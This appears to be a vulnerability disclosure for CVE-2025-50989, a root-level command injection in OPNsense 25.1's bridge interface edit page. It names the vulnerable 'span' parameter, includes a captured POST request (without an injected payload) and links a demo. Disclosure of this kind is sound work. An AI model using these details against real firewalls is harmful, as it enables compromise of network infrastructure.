CVE-2025-50989


OPNsense 25.1 contains an authenticated command injection flaw in its Bridge Interface Edit endpoint (interfaces_bridge_edit.php). The span POST parameter is concatenated into a system-level command without proper sanitization or escaping, allowing an administrator to inject arbitrary shell operators and payloads. Successful exploitation grants RCE with the privileges of the web service (typically root), potentially leading to full system compromise or lateral movement. This vulnerability arises from inadequate input validation and improper handling of user‐supplied data in backend command invocations.



Vulnerability: Command Injection

Note: The version and user below are the what was used. Other users and versions may be affected.



Version: ```OPNsense-25.1```

Authenticated: ```Yes```

User: ```Admin```

Vulnerable Parameter: ```span```

```
POST /interfaces_bridge_edit.php?id=16 HTTP/1.1
Host: 192.168.124.88
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101
Firefox/137.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.124.88/interfaces_bridge_edit.php?id=16
Content-Type: application/x-www-form-urlencoded
Content-Length: 183
Origin: http://192.168.124.88
Connection: keep-alive
Cookie: PHPSESSID=48838016cb8ce2a1c4b5371a478d545b;
cookie_test=1d294d7a2e5a97eb87d0ff7049a7dadb
Upgrade-Insecure-Requests: 1
Priority: u=0, i

VagXojD_w-BjE6WSCfwkFA=9CPTjmFBEPBu5IMEFX-ogA&descr=test&proto=rstp&maxage=&fwdelay=&holdcnt=&maxaddr=&timeout=&span=none&bridgeif=bridge17&Submit=Save&id=16
```

Demo:
![](https://github.com/4rdr/proofs/blob/main/gifs/OPNsense-25.1-Command-Injection-via-span-parameter.gif?raw=true)



